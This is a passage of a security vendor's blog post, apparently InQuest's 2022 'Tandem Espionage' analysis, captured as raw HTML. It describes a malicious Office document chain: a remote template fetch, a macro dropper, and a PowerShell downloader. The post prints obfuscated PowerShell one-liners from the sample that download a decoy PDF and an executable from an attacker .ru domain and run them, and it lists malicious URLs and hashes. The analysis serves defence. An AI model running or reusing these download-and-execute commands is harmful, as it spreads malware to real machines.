@@ -1,0 +1,944 @@
+<html lang="en" dir="ltr" prefix="content: http://purl.org/rss/1.0/modules/content/  dc: http://purl.org/dc/terms/  foaf: http://xmlns.com/foaf/0.1/  og: http://ogp.me/ns#  rdfs: http://www.w3.org/2000/01/rdf-schema#  schema: http://schema.org/  sioc: http://rdfs.org/sioc/ns#  sioct: http://rdfs.org/sioc/types#  skos: http://www.w3.org/2004/02/skos/core#  xsd: http://www.w3.org/2001/XMLSchema# " class=" js"><head>
+    <meta charset="utf-8">
+<script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script src="https://hit.uptrendsdata.com/rum.min.js" async=""></script><script src="https://js.hscollectedforms.net/collectedforms.js" type="text/javascript" id="CollectedForms-4270940" crossorigin="anonymous" data-leadin-portal-id="4270940" data-leadin-env="prod" data-loader="hs-scriptloader" data-hsjs-portal="4270940" data-hsjs-env="prod" data-hsjs-hublet="na1"></script><script src="https://js.hsadspixel.net/fb.js" type="text/javascript" id="hs-ads-pixel-4270940" data-ads-portal-id="4270940" data-ads-env="prod" data-loader="hs-scriptloader" data-hsjs-portal="4270940" data-hsjs-env="prod" data-hsjs-hublet="na1"></script><script src="https://js.hs-analytics.net/analytics/1653586800000/4270940.js" type="text/javascript" id="hs-analytics"></script><script src="https://js.hs-banner.com/4270940.js" type="text/javascript" id="cookieBanner-4270940" data-cookieconsent="ignore" data-hs-ignore="true" data-loader="hs-scriptloader" data-hsjs-portal="4270940" data-hsjs-env="prod" data-hsjs-hublet="na1"></script><script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/js?id=UA-108284164-1&amp;l=dataLayer&amp;cx=c"></script><script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script type="text/javascript" async="" src="https://snap.licdn.com/li.lms-analytics/insight.min.js"></script><script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-132691306-1"></script>
+<script>window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments)};gtag("js", new Date());gtag("config", "UA-132691306-1", {"groups":"default","anonymize_ip":true});</script>
+<link rel="canonical" href="https://inquest.net/blog/2022/05/25/tandem-espionage">
+<meta name="description" content="Some time ago, we discovered an interesting company distributing malicious documents. Which used the download chain as well as legitimate payload hosting services. In this report, we will show the technical side of this campaign and provide additional indicators.">
+<meta property="og:site_name" content="inquest.net">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://www.inquest.net/">
+<meta property="og:title" content="InQuest - Join the Hunt.">
+<meta property="og:description" content="InQuest provides Deep File Inspection (DFI) for real-time protection and RetroHunting to leverage hindsight and apply today's intelligence to yesterday's data.">
+<meta property="og:image" content="https://inquest.net/themes/custom/inquest/img/social/og.png">
+<meta name="google-site-verification" content="G_TAtqJtefMKcis-CM2j-xseyc2BHREh4HXDX_jNZSA">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:description" content="Some time ago, we discovered an interesting company distributing malicious documents. Which used the download chain as well as legitimate payload hosting services. In this report, we will show the technical side of this campaign and provide additional indicators.">
+<meta name="twitter:site" content="@inquest">
+<meta name="twitter:title" content="Tandem Espionage">
+<meta name="twitter:url" content="https://inquest.net/blog/2022/05/25/tandem-espionage">
+<meta name="twitter:image" content="https://inquest.net/sites/default/files/2022-05/1.jpeg">
+<meta name="Generator" content="Drupal 8 (https://www.drupal.org)">
+<meta name="MobileOptimized" content="width">
+<meta name="HandheldFriendly" content="true">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="shortcut icon" href="/themes/custom/inquest_salted_stone/favicon.ico" type="image/vnd.microsoft.icon">
+<link rel="revision" href="https://inquest.net/blog/2022/05/25/tandem-espionage">
+
+    <title>Tandem Espionage | InQuest</title>
+    <link rel="stylesheet" media="all" href="/sites/default/files/css/css_vdV_naanwZL7ZkbIHFNDQnQGJ5lvfhvMb1KKt_Yk0xo.css">
+<link rel="stylesheet" media="all" href="/sites/default/files/css/css_rM1kYXTYepq3PPwinue1mrXKskYNkM3_yMAQwfziyf4.css">
+<link rel="stylesheet" media="all" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.2/styles/ocean.min.css">
+<link rel="stylesheet" media="all" href="//fonts.googleapis.com/css2?family=Lato:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap">
+<link rel="stylesheet" media="all" href="/sites/default/files/css/css_Vy0rAy5KOZrf_WVj0xjEtQHtZhzVBZh2J1ESEdRJBFk.css">
+
+    
+<!--[if lte IE 8]>
+<script src="/sites/default/files/js/js_VtafjXmRvoUgAzqzYTA3Wrjkx9wcWhjP0G4ZnnqRamA.js"></script>
+<![endif]-->
+
+  <style type="text/css">#mc_embed_signup input.mce_inline_error { border-color:#6B0505; } #mc_embed_signup div.mce_inline_error { margin: 0 0 1em 0; padding: 5px 10px; background-color:#6B0505; font-weight: bold; z-index: 1; color:#fff; }</style><script charset="utf-8" src="https://platform.twitter.com/js/moment~timeline.55634fd8bf871f86dbe537f50a41349e.js"></script><script charset="utf-8" src="https://platform.twitter.com/js/timeline.2002b66aa236ee3e1e6728119a7c4b98.js"></script></head>
+  <body style="zoom: 1;">
+    
+      <div class="dialog-off-canvas-main-canvas" data-off-canvas-main-canvas="">
+    
+<div class="d-flex flex-column h-100">
+  <div class="navbar-expand-lg bg-dark px-4 py-2">
+    <div class="container d-flex align-items-right" style="position:relative;left:-2px">
+        <div class="ml-lg-auto">
+            <a href="/contact-us" class="mr-2 text-white">Contact Us</a>
+            <a href="https://support.inquest.net" class="text-white mr-2">Get Support</a>
+            <a href="/contact-us-free-assessment" class="text-white mr-2">#FreeAssessment</a>
+            <a href="/contact-us-free-intel" class="text-white">#FreeIntel</a>
+        </div>
+        <div class="ml-auto ml-lg-0">
+            <a href="https://twitter.com/inquest" class="btn-social ml-3 mr-2">
+                <svg viewBox="0 0 24 24" width="18" height="18">
+                    <use href="/themes/custom/inquest_salted_stone/assets/img/inquest-icon-twitter.svg#twitter"></use>
+                </svg>
+            </a>
+            <a href="https://linkedin.com/company/inquest.net" class="btn-social mr-2">
+                <svg viewBox="0 0 24 24" width="18" height="18">
+                    <use href="/themes/custom/inquest_salted_stone/assets/img/inquest-icon-linkedin.svg#linkedin"></use>
+                </svg>
+            </a>
+            <a href="https://github.com/inquest" class="btn-social">
+                <svg viewBox="0 0 24 24" width="18" height="18">
+                    <use href="/themes/custom/inquest_salted_stone/assets/img/inquest-icon-github.svg#github"></use>
+                </svg>
+            </a>
+        </div>
+    </div>
+</div>  
+
+
+<nav class="navbar px-4 pb-2 pb-lg-0 navbar-expand-lg navbar-dark sticky-top sticky-top-lg bg-dark size-on-scroll menu-large-init">
+  
+    <div class="container">
+  
+                  
+  <div class="block block--sitebranding">
+
+  
+    
+
+    
+  <a href="/" class="navbar-brand d-flex align-items-center " aria-label="">
+            <img src="/themes/custom/inquest_salted_stone/logo.svg" width="145" height="auto" alt="InQuest logo" class="mr-2">
+
+        
+  </a>
+
+
+  </div>
+
+
+          
+    <div class="d-flex order-lg-3 ml-auto mr-3 mr-lg-0">
+      <a class="btn-social mr-3" target="_blank" rel="noopener noreferrer" href="mailto:info@inquest.net">
+        <svg viewBox="0 0 24 24" width="18" height="18">
+          <use href="/themes/custom/inquest_salted_stone/assets/img/inquest-icon-contact.svg#contact"></use>
+        </svg>
+      </a>
+      <a class="btn-search btn-social" href="#">
+        <svg viewBox="0 0 24 24" width="18" height="18">
+          <use href="/themes/custom/inquest_salted_stone/assets/img/inquest-icon-search.svg#search"></use>
+        </svg>
+      </a>
+    </div>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target=".navbar-collapse" aria-controls="navbar-collapse" aria-expanded="false" aria-label="Toggle navigation">
+      <span class="navbar-toggler-icon"></span>
+    </button>
+    <div class="collapse navbar-collapse order-3 order-lg-1">
+            <ul class="nav navbar-nav w-100">
+    <li class="nav-item dropdown-rollout">
+        <a href="#" class="nav-link d-flex">
+            <div class="flex-grow-1 d-flex">
+                <img src="/themes/custom/inquest_salted_stone/assets/img/inquest-icon-cloud-white.svg" alt="Cloud Icon" class="mr-1"> <span>Protect the Cloud</span>
+            </div>
+            <div class="d-lg-none">
+                <img src="/themes/custom/inquest_salted_stone/assets/img/down-blank.svg" alt="Dropdown Icon">
+            </div>
+        </a>
+        <div class="dropdown-menu-rollout">
+            <div class="container">
+                <div class="dropdown-menu-content">
+                    <div class="row m-0">
+                        <div class="col-lg-7 dropdown-menu-content-inner">
+                            <h2 class="mb-4">Protect the Cloud</h2>
+                            <div class="my-2">
+                                <a href="/protect-the-cloud/email-security-saas" class="d-block">
+                                    <span class="font-weight-bold">Integrated Cloud Email Security</span>
+                                    <p class="text-muted hide-sm">Our integrated cloud email security model provides protection against malware, phishing, and ransomware including targeted attack protection, imposter emails, business email compromise, spam and more.</p>
+                                </a>
+                            </div>
+                            <div class="my-2">
+                                <a href="/protect-the-cloud/web-security-saas" class="d-block">
+                                    <span class="font-weight-bold">Web Security SaaS</span>
+                                    <p class="text-muted hide-sm">Cloud-delivered, Web Security Platform that provides inline security and policy enforcement at scale even in the most complex multi-tenant environments.</p>
+                                </a>
+                            </div>
+                            <div>
+                                <a href="/protect-the-cloud/retrohunting-as-a-service" class="d-block mb-md-0 mb-4">
+                                    <span class="font-weight-bold">RetroHunting as a Service</span>
+                                    <p class="text-muted hide-sm">Conduct proactive Threat Hunting Operations in the Cloud through the use of automated, ad-hoc or scheduled retrospective analysis using our RetroHunt Engine.</p>
+                                </a>
+                            </div>
+                            <div class="mb-2">
+                                <a href="/protect-the-cloud/dfi-analytical-pipeline" class="d-block">
+                                    <span class="font-weight-bold">DFI Analytical Pipeline</span>
+                                    <p class="text-muted hide-sm">Cloud-delivered, high-throughput APIs that support direct data ingestion to the Deep File Inspection pipeline and provide threat analytics at scale.</p>
+                                </a>
+                            </div>
+                            <img src="/themes/custom/inquest_salted_stone/assets/img/separator-red.svg" alt="Content Separator" class="mt-4 hide-sm" style="width: 120px">
+                        </div>
+                        <div class="col-lg-5 dropdown-menu-content-inner d-none d-lg-flex bg-dark-grey align-items-center">
+                            <div>
+                                <img src="/themes/custom/inquest_salted_stone/assets/img/protect-the-cloud.svg" alt="Protecting the Cloud Icon" class="mb-4" style="width: 200px">
+                                <p>Transformative SaaS security enabling your digital transition to a highly-scalable and multi-tenant cloud-native architecture.</p>
+                                <img src="/themes/custom/inquest_salted_stone/assets/img/separator-white.svg" alt="Content Separator" class="my-4" style="width: 120px">
+                                <br>
+                                <a href="/protect-the-cloud/dfi-analytical-pipeline" class="text-white d-flex align-items-center"><span>Read more</span> <img src="/themes/custom/inquest_salted_stone/assets/img/arrow-thick.svg" alt="Read More Arrow Icon" class="ml-2" style="width: 20px"></a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="dropdown-menu-footer bg-dark">
+    <div class="row">
+        <div class="d-flex justify-content-between">
+            <a href="/blog" class="mr-5">Blog</a>
+            <a href="/newsletter" class="mr-5">Newsletter</a>
+            <a href="/resources/white-papers" class="mr-5">White Papers</a>
+            <a href="https://labs.inquest.net" class="mr-5">InQuest Labs</a>
+            <a href="/trystero" class="mr-5">Trystero</a>
+            <a href="/support">Support</a>
+        </div>
+    </div>
+</div>            </div>
+        </div>
+    </li>
+    <li class="nav-item dropdown-rollout">
+        <a href="#" class="nav-link d-flex">
+            <div class="flex-grow-1 d-flex">
+                <img src="/themes/custom/inquest_salted_stone/assets/img/inquest-icon-corporation-white.svg" alt="Enterprise / Skyscrapers / Corporate Icon" class="mr-1" style="width:20px;height:20px"> <span>Defend the Enterprise</span>
+            </div>
+            <div class="d-lg-none">
+                <img src="/themes/custom/inquest_salted_stone/assets/img/down-blank.svg" alt="Dropdown Icon">
+            </div>
+        </a>
+        <div class="dropdown-menu-rollout">
+            <div class="container">
+                <div class="dropdown-menu-content">
+                    <div class="row m-0">
+                        <div class="col-lg-7 dropdown-menu-content-inner">
+                            <h2 class="mb-4">Defend the Enterprise</h2>
+                            <div class="my-2">
+                                <a href="/defend-the-enterprise/network-detection-and-response" class="d-block">
+                                    <span class="font-weight-bold">Network Detection &amp; Response</span>
+                                    <p class="text-muted hide-sm">Monitoring of network traffic at throughput speeds up to 40Gb per second coupled with session and flow analysis leveraging behavioral and advanced analytical techniques, such as machine learning, to identify and respond to anomalous or suspicious behavior.</p>
+                                </a>
+                            </div>
+                            <div>
+                                <a href="/defend-the-enterprise/threat-prevention" class="d-block mb-md-0 mb-4">
+                                    <span class="font-weight-bold">Threat Prevention</span>
+                                    <p class="text-muted hide-sm">Through continuous monitoring and visibility of your data-in-motion, the DFI platform leverages the MITRE ATT&amp;CK framework to identify and protect against adversary tactics and techniques in real-time.</p>
+                                </a>
+                            </div>
+                            <div class="my-2">
+                                <a href="/defend-the-enterprise/breach-detection" class="d-block">
+                                    <span class="font-weight-bold">Breach Detection</span>
+                                    <p class="text-muted hide-sm">Identify command and control (C2) activity associated with sophisticated threat actor activity by performing behavioral analytics and leveraging unique Indicators of Compromise acquired and curated by our InQuest Labs researchers</p>
+                                </a>
+                            </div>
+                            <div class="my-2">
+                                <a href="/defend-the-enterprise/data-loss-discovery" class="d-block">
+                                    <span class="font-weight-bold">Data Loss Discovery</span>
+                                    <p class="text-muted hide-sm">Our Data Loss Discovery Engine leverages machine vision through the use of Optical Character Recognition (OCR) and image perception hashing to inspect traffic, files and objects in-motion as well as at-rest to identify sensitive information such as PII and PHI being exposed.</p>
+                                </a>
+                            </div>
+                            <img src="/themes/custom/inquest_salted_stone/assets/img/separator-red.svg" alt="Content Separator" class="mt-4 hide-sm" style="width: 120px">
+                        </div>
+                        <div class="col-lg-5 dropdown-menu-content-inner d-none d-lg-flex bg-dark-grey align-items-center">
+                            <div>
+                                <img src="/themes/custom/inquest_salted_stone/assets/img/defend-the-enterprise.svg" alt="Enterprise Illustration" class="mb-4" style="width: 200px">
+                                <p>Secure your enterprise by delivering proactive threat prevention to your client networks while protecting your users and safeguarding your data.</p>
+                                <img src="/themes/custom/inquest_salted_stone/assets/img/separator-white.svg" alt="Content Separator" class="my-4" style="width: 120px">
+                                <br>
+                                <a href="/defend-the-enterprise/breach-detection" class="text-white d-flex align-items-center"><span>Read more</span> <img src="/themes/custom/inquest_salted_stone/assets/img/arrow-thick.svg" alt="Read More Arrow Icon" class="ml-2" style="width: 20px"></a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="dropdown-menu-footer bg-dark">
+    <div class="row">
+        <div class="d-flex justify-content-between">
+            <a href="/blog" class="mr-5">Blog</a>
+            <a href="/newsletter" class="mr-5">Newsletter</a>
+            <a href="/resources/white-papers" class="mr-5">White Papers</a>
+            <a href="https://labs.inquest.net" class="mr-5">InQuest Labs</a>
+            <a href="/trystero" class="mr-5">Trystero</a>
+            <a href="/support">Support</a>
+        </div>
+    </div>
+</div>            </div>
+        </div>
+    </li>
+    
+    <li class="nav-item dropdown-rollout">
+    <a href="#" class="nav-link d-flex"><div class="flex-grow-1 d-flex"><img src="/themes/custom/inquest_salted_stone/assets/img/inquest-icon-operations-white.svg" alt="Empowering Operations Crosshair Icon" class="mr-1"> <span>Empower Your Operations</span></div><div class="d-lg-none"><img src="/themes/custom/inquest_salted_stone/assets/img/down-blank.svg" alt="Dropdown Icon"></div></a>
+    <div class="dropdown-menu-rollout">
+        <div class="container">
+        <div class="dropdown-menu-content">
+        <div class="dropdown-menu-content-inner">
+        <h2 class="mb-5 pb-3 header-border">Empower Your Operations</h2>
+        <div class="row m-0">
+            <div class="col-lg-3">
+            <div class="my-2">
+                <a href="/empower-your-operations/deep-file-inspection" class="d-block">Deep File Inspection</a>
+            </div>
+            <div class="my-2">
+                <a href="/empower-your-operations/retrohunt" class="d-block">RetroHunt</a>
+            </div>
+            <div class="my-2">
+                <a href="/empower-your-operations/threat-intelligence" class="d-block">Threat Intelligence</a>
+            </div>
+            <div class="my-2">
+                <a href="/empower-your-operations/intelligent-orchestration" class="d-block">Intelligent Orchestration</a>
+            </div>
+            </div>
+            <div class="col-lg-5 d-none d-lg-block">
+            From Deep File Inspection and RetroHunt to Threat Intelligence and Intelligent Orchestration we provide a wide range of services to empower your operations.
+            </div>
+            <div class="col-lg-4 pl-5 text-center d-none d-lg-block">
+            <img src="/themes/custom/inquest_salted_stone/assets/img/hunter.png" alt="Hunter Drone Ship Illustration" class="w-100">
+            </div>
+        </div>
+        </div>
+        </div>
+
+        <div class="dropdown-menu-footer bg-dark">
+    <div class="row">
+        <div class="d-flex justify-content-between">
+            <a href="/blog" class="mr-5">Blog</a>
+            <a href="/newsletter" class="mr-5">Newsletter</a>
+            <a href="/resources/white-papers" class="mr-5">White Papers</a>
+            <a href="https://labs.inquest.net" class="mr-5">InQuest Labs</a>
+            <a href="/trystero" class="mr-5">Trystero</a>
+            <a href="/support">Support</a>
+        </div>
+    </div>
+</div>        </div>
+    </div>
+
+    </li>
+    <li class="nav-item dropdown-rollout">
+    <a href="#" class="nav-link d-flex"><div class="flex-grow-1 d-flex"><img src="/themes/custom/inquest_salted_stone/assets/img/inquest-icon-more-white.svg" alt="Read More / Ellipsis Icon" class="mr-1"> <span>More</span></div><div class="d-lg-none"><img src="/themes/custom/inquest_salted_stone/assets/img/down-blank.svg" alt="Dropdown Icon"></div></a>
+    <div class="dropdown-menu-rollout">
+        <div class="container">
+        <div class="dropdown-menu-content">
+        <div class="dropdown-menu-content-inner">
+        <h2 class="mb-5 pb-3 header-border">More</h2>
+        <div class="row mb-4">
+            <div class="col-lg-2">
+            <h5>Company</h5>
+            <div class="my-2">
+                <a href="/company/why-inquest" class="d-block">Why InQuest?</a>
+            </div>
+            <div class="my-2">
+                <a href="/company/leadership" class="d-block">Leadership</a>
+            </div>
+            <div class="my-2">
+                <a href="/press-releases" class="d-block">Press Releases</a>
+            </div>
+            <div class="my-2">
+                <a href="/events" class="d-block">Events</a>
+            </div>
+            </div>
+            <div class="col-lg-3">
+            <h5>Products and Services</h5>
+            <div class="my-2">
+                <a href="/products" class="d-block">Products</a>
+            </div>
+            <div class="my-2">
+                <a href="/services" class="d-block">Services</a>
+            </div>
+            </div>
+            <div class="col-lg-4">
+            <h5>Partners</h5>
+            <div class="my-2">
+                <a href="/partners" class="d-block d-lg-none">Our Partners</a>
+            </div>
+            <a href="/partners" class="mt-2 d-none d-lg-block"><img src="/themes/custom/inquest_salted_stone/assets/img/logos-collage.png" alt="Partner Logos Collage"></a>
+            </div>
+            <div class="col-lg-3">
+            <h5>Resources</h5>
+            <div class="my-2">
+                <a href="/blog" class="d-block">Blog</a>
+            </div>
+            <div class="my-2">
+                <a href="https://labs.inquest.net" class="d-block">InQuest Labs</a>
+            </div>
+            <div class="my-2">
+                <a href="/flash-alerts" class="d-block">Flash Alerts</a>
+            </div>
+            <div class="my-2">
+                <a href="/downloads" class="d-block">Downloads</a>
+            </div>
+            <div class="my-2">
+                <a href="/newsletter" class="d-block">Newsletter</a>
+            </div>
+            <div class="my-2">
+                <a href="/use-cases" class="d-block">Use Cases</a>
+            </div>
+            <div class="my-2">
+                <a href="/resources/whitepapers" class="d-block">White Papers</a>
+            </div>
+            <div class="my-2">
+                <a href="/trystero" class="d-block">Trystero</a>
+            </div>
+            <div class="my-2">
+                <a href="/malware-lures-gallery">Curated Gallery of Malware Lures</a>
+            </div>
+            <div class="my-2">
+                <a href="/roi-calculators">ROI Calculators</a>
+            </div>
+            </div>
+
+        </div>
+        <div class="row">
+            <div class="col-lg-12">
+            <h5>Support</h5>
+            <div class="my-2">
+                <a href="/support" class="d-block">Global Priority Level Definitions and Target Initial Response Times</a>
+            </div>
+            </div>
+        </div>
+        </div>
+        </div>
+
+        <div class="dropdown-menu-footer bg-dark">
+    <div class="row">
+        <div class="d-flex justify-content-between">
+            <a href="/blog" class="mr-5">Blog</a>
+            <a href="/newsletter" class="mr-5">Newsletter</a>
+            <a href="/resources/white-papers" class="mr-5">White Papers</a>
+            <a href="https://labs.inquest.net" class="mr-5">InQuest Labs</a>
+            <a href="/trystero" class="mr-5">Trystero</a>
+            <a href="/support">Support</a>
+        </div>
+    </div>
+</div>        </div>
+    </div>
+
+    </li>
+</ul>                  
+          </div>
+
+    </div>
+  
+</nav>
+<div class="page-header-search p-5">
+  <form class="views-exposed-form" data-drupal-selector="views-exposed-form-search-search-page" action="/search" method="get" id="views-exposed-form-search-search-page" accept-charset="UTF-8" data-hs-cf-bound="true">
+  <div class="js-form-item form-item js-form-type-textfield form-item-keys js-form-item-keys form-group">
+      <label for="edit-keys">Search</label>
+          
+<input data-drupal-selector="edit-keys" type="text" id="edit-keys" name="keys" value="" size="30" maxlength="128" class="form-control" placeholder="Search"><div class="d-flex align-items-center ml-2"><a class="btn-search-close" href="/search"><img src="/themes/custom/inquest_salted_stone/assets/img/icon-search-close-black.svg" alt="Close Icon"></a></div>
+
+        </div>
+<div data-drupal-selector="edit-actions" class="form-actions js-form-wrapper form-wrapper" id="edit-actions">  <input data-drupal-selector="edit-submit-search" type="submit" id="edit-submit-search" value="Search" class="button js-form-submit form-submit btn btn-primary">
+
+
+</div>
+
+
+</form>
+
+</div>
+
+  <div class="page flex-grow-1 d-flex flex-column">
+    <main class="flex-grow-1">
+      
+      
+                  <div class="container py-5">
+            <h1 class="m-0">Tandem Espionage</h1>
+          </div>
+        
+        <div class="page__content container">
+            <div data-drupal-messages-fallback="" class="hidden"></div>
+
+  <div class="block block--basic block--inquest-salted-stone-linkedintracker">
+
+  
+    
+
+      
+            <div class="basic__body"><!-- linkedin -->
+<script type="text/javascript">
+_linkedin_partner_id = "436170";
+window._linkedin_data_partner_ids = window._linkedin_data_partner_ids || [];
+window._linkedin_data_partner_ids.push(_linkedin_partner_id);
+</script><script type="text/javascript">
+(function(){var s = document.getElementsByTagName("script")[0];
+var b = document.createElement("script");
+b.type = "text/javascript";b.async = true;
+b.src = "https://snap.licdn.com/li.lms-analytics/insight.min.js";
+s.parentNode.insertBefore(b, s);})();
+</script>
+<noscript>
+<img height="1" width="1" style="display:none;" alt="" src="https://dc.ads.linkedin.com/collect/?pid=436170&fmt=gif" />
+</noscript>
+</div>
+      
+  
+  </div>
+<article role="article" about="/blog/2022/05/25/tandem-espionage" typeof="schema:Article" class="node node--promoted article article--full">
+  
+    <span property="schema:name" content="Tandem Espionage" class="hidden"></span>
+
+
+      
+          <footer class="text-muted mb-3">
+        
+        <div>
+          Posted on 2022-05-25 by Dmitry Melikov
+            <span property="schema:dateCreated" content="2022-05-25T16:18:18+00:00" class="hidden"></span>
+
+        </div>
+      </footer>
+    
+    <div>
+      
+            <div property="schema:text" class="article__body">
+<p>Some time ago, we discovered an interesting campaign distributing malicious documents. Which used the download chain as well as legitimate payload hosting services. In this report, we will show the technical side of this campaign as well as provide additional indicators.</p>
+
+
+
+<figure class="wp-block-table"><table><tbody><tr><td>File Type&nbsp;</td><td>Office Open XML Document</td></tr><tr><td>SHA256</td><td><a href="https://labs.inquest.net/dfi/sha256/b3920fe11f1dcaf5a7f4cb8a37bed2dd6a8638c5f8a4312d4c07d11f7d0e62da">b3920fe11f1dcaf5a7f4cb8a37bed2dd6a8638c5f8a4312d4c07d11f7d0e62da&nbsp;</a></td></tr></tbody></table></figure>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-full"><img src="/sites/default/files/inline-images/1.jpeg" alt="" class="wp-image-1675" data-entity-type="file" data-entity-uuid="18e15b13-1263-4581-8aa2-4174f9f2f507" data-image-style="original"><figcaption>Image 1: Coercive graphical lure</figcaption></figure></div>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-full"><img src="/sites/default/files/inline-images/2_3.png" alt="" class="wp-image-1676" data-entity-type="file" data-entity-uuid="1b55a426-9a47-4150-a84a-74a6a0d43b4c" data-image-style="original"><figcaption>Image 2: Low AV detection</figcaption></figure></div>
+
+
+
+<p>A check on the VirusTotal service showed a very superficial detection. If we unpack the document, then we can see a lot of information that the XML files contain. We see how the .xml file “settings.xml.rels” abuses the element &lt;Relationship&gt; to download the next payload stage. Using the following url “hxxps://github[.]com/Collabsss/dotm/raw/main/tj3wqx.dotm”</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-full"><img src="/sites/default/files/inline-images/3_1.png" alt="" class="wp-image-1677" data-entity-type="file" data-entity-uuid="cbce71a1-1efd-4671-848c-65a6957a7678" data-image-style="original"><figcaption>Figure 3: XML file loads payload</figcaption></figure></div>
+
+
+
+<figure class="wp-block-table"><table><tbody><tr><td>File Type&nbsp;</td><td>Office Open XML Document</td></tr><tr><td>SHA256</td><td><a href="https://labs.inquest.net/dfi/sha256/b9a1ac0335226386029bb3b6f9f3b9114bde55c7ea9f4fdcdccc02593208bdfd">b9a1ac0335226386029bb3b6f9f3b9114bde55c7ea9f4fdcdccc02593208bdfd</a></td></tr></tbody></table></figure>
+
+
+
+<p>The document of the second stage contains macros and InQuest Labs is great at extracting the macro to understand how it works.&nbsp;</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-full"><img src="/sites/default/files/inline-images/4_2.png" alt="" class="wp-image-1678" data-entity-type="file" data-entity-uuid="6dcfb10c-1e7b-4072-b6b8-cabee77bd1b5" data-image-style="original"><figcaption>Image 4: Malicious second stage macro</figcaption></figure></div>
+
+
+
+<p>The macro converts the URL and then loads the executable into the directory "C:\\Users\\Public\\servicehomework.exe". Once downloaded, the executable file is launched.</p>
+
+
+
+<figure class="wp-block-table"><table><tbody><tr><td>File Type&nbsp;</td><td>x64 Executable.</td></tr><tr><td>SHA256</td><td><a href="https://www.virustotal.com/gui/file/7093aba8ae03275caab7372a7d56172df1716120d477dc276ee9f0b08816bd0c">7093aba8ae03275caab7372a7d56172df1716120d477dc276ee9f0b08816bd0c</a></td></tr></tbody></table></figure>
+
+
+
+<p>The functionality of this executable is quite simple. It executes consecutive PowerShell scripts that are Base64 encoded; between network requests, the program goes to sleep for 5 minutes</p>
+
+
+
+<p></p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large"><img src="/sites/default/files/styles/large/public/inline-images/5_3.png?itok=TI9MV47v" alt="" class="wp-image-1680" data-entity-type="file" data-entity-uuid="0f3a34ff-75c9-42d5-9ae1-ed6c11e5808d" data-image-style="original"><figcaption>Image 5: Functionality</figcaption></figure></div>
+
+
+
+<p>This executable has two main tasks: Downloads a PDF file from hxxp://rwwmefkauiaa[.]ru/document1916t.pdf and opens it. This is done to distract the user from further payload execution.&nbsp;</p>
+
+
+
+<p>With this obfuscated script, a PDF file is loaded.</p>
+
+
+
+<pre class="wp-block-code"><code>&amp;("{0}{1}{3}{2}"-f'In',("{2}{1}{3}{0}"-f'e','e','vok',("{1}{0}"-f("{1}{0}"-f'bR','We'),'-')),'st','que')("{3}{2}{0}{1}{5}{7}{4}{6}"-f("{1}{0}"-f'ka','mef'),("{0}{1}"-f'uia','a.'),("{0}{1}"-f'/',("{0}{1}"-f'/r','ww')),("{1}{0}"-f'p:','htt'),("{0}{1}{2}"-f'ent','19','1'),("{0}{1}"-f'ru',("{1}{0}"-f'doc','/')),("{0}{1}"-f'6',("{0}{1}"-f't',("{0}{1}"-f'.pd','f'))),'um')-OutFile"$env:userprofile/Documents/document01.pdf";.("{0}{1}"-f'St','art')"$env:userprofile/Documents/document01.pdf"</code></pre>
+
+
+
+<p>Executing a command to launch a PDF file.</p>
+
+
+
+<pre class="wp-block-code"><code>C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroRd32.exe" "C:\Users\Admin\Documents\document01.pdf</code></pre>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-full"><img src="/sites/default/files/inline-images/6_1.png" alt="" class="wp-image-1681" data-entity-type="file" data-entity-uuid="39015e2d-8db8-4806-a46a-48dc77b4d49d" data-image-style="original"><figcaption>Image 7:<a href="https://www.virustotal.com/gui/file/21bee7d6fd38d4c66deb99404cb48c10677ebfb4bb62843fdac97494426f51ea"> Downloaded PDF</a><br> 21bee7d6fd38d4c66deb99404cb48c10677ebfb4bb62843fdac97494426f51ea </figcaption></figure></div>
+
+
+
+<p><a href="http://rwwmefkauiaa.ru/document1916t.pdf*"></a></p>
+
+
+
+<p>The following obfuscated script downloads an executable from this address.</p>
+
+
+
+<p>h<strong>xxp://rwwmefkauiaa[.]ru/u84ls.exe</strong></p>
+
+
+
+<pre class="wp-block-code"><code>.("{2}{4}{1}{3}{0}"-f("{0}{2}{1}"-f("{0}{1}"-f'ebR','e'),'t',("{0}{1}"-f'que','s')),'e-','In','W','vok')("{1}{3}{5}{0}{2}{4}{6}"-f("{0}{1}{2}"-f'hx',("{1}{0}"-f'a',("{0}{1}"-f'.ru','/')),'0hn'),'htt',("{0}{1}"-f("{0}{1}"-f("{1}{0}"-f'ee1','g'),'8'),'y'),("{0}{2}{1}{3}"-f'p:/',("{1}{0}"-f'n',("{1}{0}"-f("{1}{0}"-f'p',("{1}{0}"-f'w','ugd')),'c')),'/','y'),'3z','kg',("{0}{1}"-f'.e','xe'))-OutFile"$env:appdata/pkdzb.exe"</code></pre>
+
+
+
+<p><strong>hxxp://rwwmefkauiaa[.]ru/builded1916t.exe</strong></p>
+
+
+
